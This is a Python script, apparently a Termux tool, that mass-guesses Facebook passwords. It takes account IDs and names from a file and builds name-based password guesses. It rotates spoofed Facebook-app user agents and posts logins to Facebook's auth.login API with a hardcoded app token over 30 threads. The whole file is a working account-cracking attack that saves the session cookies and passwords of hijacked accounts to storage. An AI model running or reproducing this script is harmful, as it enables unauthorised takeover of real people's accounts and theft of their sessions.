import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx,base64
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as M4H4D1
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system('git pull');os.system('termux-setup-storage -y')
try:
    import requests
except ImportError:
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    os.system('pip install bs4')
    
#------------------[ ID DATE ]-------------------#
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\033[1;31m"
green="\033[1;32m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;41m"
pvt = "\033[1;0m"
my_color = [white,blue,green];warna = random.choice(my_color)
loop = 0
oks = []
cps = []
id = []

#os.system('xdg-open https://github.com/SEFAT-MAHADI') 
logox=(f"""
\033[1;37mm8888b. d88888b db    db d888888b db      .d8888. 
\033[1;37m88  `8D 88'     88    88   `88'   88      88'  YP 
\033[1;37m88   88 88ooooo Y8    8P    88    88      `8bo.   
\033[1;32m88   88 88~~~~~ `8b  d8'    88    88        `Y8b. 
\033[1;32m88  .8D 88.      `8bd8'    .88.   88booo. db   8D 
\033[1;32m8888D' Y88888P    YP    Y888888P Y88888P `8888Y' 
\033[1;37m════════════════════════════════════════════════
\033[1;32m  • \033[1;37m Tool Owner :-  MD.RIYAD
\033[1;32m  • \033[1;37m GitHub     :-  XD719
\033[1;32m  • \033[1;37m Type       :-  PERSONAL 
\033[1;32m  • \033[1;37m Version    :-  V 0.7
════════════════════════════════════════════════
    """)
def logo():
    os.system('clear')
    print(logox)

def linex():
        print(f"\033[0;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") 
def foxF():
    global oks,cps
    os.system('clear');logo()
    dfile = input("\033[0;36m</>\033[38;5;46mENTER FILE: ")
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);foxF()
    dplist = []
    try:
        os.system('clear');logo()
        pass_lmit = int(input('\033[0;36m</>\033[38;5;46mPASSWORD LIMIT : '))
    except:
        pass_lmit =1
    for i in range(pass_lmit):
        dplist.append(input(f'\033[0;36m</>\033[38;5;46mPASSWORD NO.{i+1} : '))
    with ThreadPool(max_workers=30) as Mahadi:
        os.system('clear');logo();total_ids = str(len(dx))
        print(f'\033[0;36m</>\033[38;5;46mTOTAL ACCOUNT : '+total_ids)
        print(f'\033[0;36m</>\033[38;5;46mIF NO RESULT USE AIRPLANE MODE')
        print(f'\033[0;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for user in dx:
            ids,names = user.split('|')
            passlist = ['first last','firstlast','first123','first@123','57273200','59039200','first@1234','57575751','57575752','07860786','First Last','first12','first@12']
            Mahadi.submit(FoXCRK,ids,names,passlist)
    linex()
    print("\033[0;36m</>\033[38;5;46mTHE CRACKING IS COMPLETED")
    print('\033[0;36m</>\033[38;5;46mTOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    sys.exit()
#---------------
def HOP_M1():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
        return ua
#__________________[ M2 ]__________________#
def HOP_M2():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
        return ua
#__________________[ M3 ]__________________#
def HOP_M3():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
        return ua
        
ZEROapi=[]
for ksh in range(5000):
	samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
	fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
	fbbv = str(random.randint(000000000,999999999))
	fbrv = str(random.randint(000000000,999999999))
	accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
	fbsv = str(random.randint(4,13))+'.0'
	model,build = random.choice(samsung).split('|')
	fbmf = 'samsung'
	fbbd = 'samsung'
	en = random.choice(['en_US','en_GB'])
	cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
	network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
	ua2 = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]"
	ZEROapi.append(ua2)
for khd in range(5000):
	VAPP = random.randint(410000000,499999999)
	fbs = random.choice([
		'com.facebook.adsmanager',
		'com.facebook.lite',
		'com.facebook.orca',
		'com.facebook.katana',
		'com.facebook.mlite'])
	vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
	gtt=random.choice(gt)
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(7,13)}; {str(gtt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/BSNL MOBILE;FBMF/asus;FBBD/asus;FBPN/"+fbs+";FBDV/ASUS_Z00LD;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
	ZEROapi.append(ua)
for okdk in range(5000):
	application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
	application_version_code=str(random.randint(000000000,999999999))
	numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
	build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
	sims = random.choice(["Telenor", "Movistar", "Telenor PK", "MTN NG", "Glo NG", "UFONE-PAKTel", "TRUE-H", "Cerillion", "Zong", "IDEA", "Jazz", "SCO", "Jio", "Jio 4G", "Vodafone", "Airtel", "BSNL", "MTNL", "Grameenphone", "Robi", "Visible", "Banglalink", "Teletalk", "TNT", "Telkomsel", "Indosat Ooredoo", "Axiata", "Tri", "Smartfren", "China Mobile", "Unicom", "SFR", "null", "Telecom", "Satcom", "Docomo", "Rakuten", "IIJmio", "Orange", "Tele2", "Vi India", "EE", "MtelBG", "Oi", "CLARO BR", "FASTWEB", "Sprint", "ParMieru", "DNA PLC", "CelcomDigi", "dtac"])
	fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
	uaa = f'Davik/2.1.0 (Linux; U; Android 12.0.0; 22111317I Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.5,width=1080,height=2400};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(sims)};FBMF/Xiaomi;FBBD/Redmi;FBPN/{str(fbs)};FBDV/22111317I;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
	uab = f'Davik/2.1.0 (Linux; U; Android 5.1.0; SM-J500F Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.5,width=720,height=1280};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/SM-J500F;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]'
	uac = f'Davik/2.1.0 (Linux; U; Android 2.1.0; GT-I9000 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=480,height=800};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/GT-I9000;FBSV/2.1;nullFBCA/armeabi-v7a:armeabi;]'
	uad = f'Davik/2.1.0 (Linux; U; Android 2.3.4; GT-I9100 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=480,height=800};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/GT-I9100;FBSV/2.3.4;nullFBCA/armeabi-v7a:armeabi;]'
	uae = f'Davik/2.1.0 (Linux; U; Android 10.0.0; SM-M013F Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.8,width=720,height=1480};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/SM-M013F;FBSV/10;nullFBCA/armeabi-v7a:armeabi;]'
	uaf = f'Davik/2.1.0 (Linux; U; Android 2.3.5; GT-S5360 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=240,height=320};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/GT-S5360;FBSV/2.3.5;nullFBCA/armeabi-v7a:armeabi;]'
	uag = f'Davik/2.1.0 (Linux; U; Android 2.1.0; GT-I9000 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=480,height=800};'+f'FBLC/en_US;FBCR/{str(sims)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/GT-I9000;FBSV/2.1;nullFBCA/armeabi-v7a:armeabi;]'
	uaall =([uaa,uab,uac,uad,uae,uaf,uag])
	ua = random.choice(uaall)
	#print(f' {B}|{G}USERAGENT{B}|{P} {ua}');time.sleep(2);sifat()
	ZEROapi.append(ua)
#---------------
get_ua_list = requests.get("https://raw.githubusercontent.com/Peaky-XD/X-SERVER/main/dav.txt").text.splitlines()
###--------------------[CHANING COLORS]----------------###
colors = ["\033[0;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]

def FoXCRK(ids,names,passlist):
    global loop,oks,cps
    x = random.choice(colors)
    sys.stdout.write(f'\r{x}\033[37;1m | {ids} \033[37;1m|\033[37;1m %s | \033[37;1mOK:-\033[38;5;46m%s \033[38;5;46m'%(loop,len(oks)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            ua = random.choice(ZEROapi)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            adid = str(uuid.uuid4())
            data = {
                'adid':adid,
                'format':'json',
                'device_id':adid,
                'email':ids,
                'password':pas,
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                'generate_analytics_claims':'1',
                'credentials_type':'password',
                'source':'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                "locale":"en_US","client_country_code":"US", 'fb_api_req_friendly_name':'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
            head ={
                'Authorization':f'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'X-FB-device-group': str(random.randint(2000, 4000)),
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                'X-FB-Friendly-Name':'authenticate',
                'X-FB-Connection-Type':'unknown',
                'X-FB-connection-quality':'EXCELLENT',
                "X-Tigon-Is-Retry": "False",
                'User-Agent':ua,
                #'User-Agent':random.choice(get_ua_list),
                "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                'Accept-Encoding':'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                'X-FB-HTTP-Engine': 'Liger',
                }
            po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).text
            load = json.loads(po)
            if 'session_key' in load:
                kuki = ";".join(i["name"]+"="+i["value"] for i in load["session_cookies"])
                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookie = f"sb={sb};{kuki}"
                ids=str(load['uid'])
                print('\r\r\033[38;5;46m[FOX] '+ids+' | '+pas)
                print(f"\033[38;5;46m[\033[0;36mCOOKIE\033[38;5;46m]> {cookie}")
                linex()
                oks.append(ids)
                open('/sdcard/RAKIB-OK.txt','a').write(f"{ids}|{pas}|{cookie}")
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

     
foxF()